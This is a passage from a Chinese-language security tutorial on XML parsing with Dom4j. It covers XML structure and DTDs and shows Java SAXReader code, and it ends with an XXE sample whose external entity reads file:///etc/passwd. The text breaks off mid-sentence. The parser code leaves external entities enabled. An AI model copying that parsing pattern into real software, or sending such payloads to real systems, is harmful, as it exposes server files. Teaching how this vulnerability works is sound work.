## 14.1 XML解析原理

解析XML的中间件较多，本节以Dom4j为例子说明XML解析的原理。

### 14.1.1 XML结构

结构分为三部分，XML声明、DTD文档类型定义（可选）、文档元素


DTD(文档类型定义)
dtd作用是定义 XML 文档的规则模块。DTD 可以在 XML 文档内声明，也可以外部引用。


### 14.1.2 文档读取源码解析

DOM4J是 dom4j.org 出品的一个开源 XML 解析包。DOM4J应用于 Java 平台，采用了 Java 集合框架并完全支持 DOM，SAX 和 JAXP。

DOM4J 使用起来非常简单。只要你了解基本的 XML-DOM 模型，就能使用。

Dom：把整个文档作为一个对象。

DOM4J 最大的特色是使用大量的接口。它的主要接口都在org.dom4j里面定义

https://github.com/dom4j/dom4j/wiki/FAQ

读写XML文档主要依赖于org.dom4j.io包，有DOMReader和SAXReader两种方式。因为利用了相同的接口，它们的调用方式是一样的。

```java
public static Document load(String filename) {  
    Document document = null;  
    try {  
        SAXReader saxReader = new SAXReader();  
        document = saxReader.read(new File(filename)); // 读取XML文件,获得document对象  
    } catch (Exception ex) {  
        ex.printStackTrace();  
    }  
    return document;  
}  
  
public static Document load(URL url) {  
    Document document = null;  
    try {  
        SAXReader saxReader = new SAXReader();  
        document = saxReader.read(url); // 读取XML文件,获得document对象  
    } catch (Exception ex) {  
        ex.printStackTrace();  
    }  
    return document;  
}
```

```java
public class Main {
    public static void main(String[] args) throws Exception {
        File file = new File("src/main/resources/xxe.xml");
        Document doc = new SAXReader().read(file);
        Element rootElement = doc.getRootElement();
        System.out.println(rootElement.element("user"));
    }
}
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY rabbit SYSTEM "file:///etc/passwd" >]>
<user>
    <firstname>&rabbit;</firstname>
    <lastname>don9sec</lastname>
</user>
```

当XML文档包含外部实体时，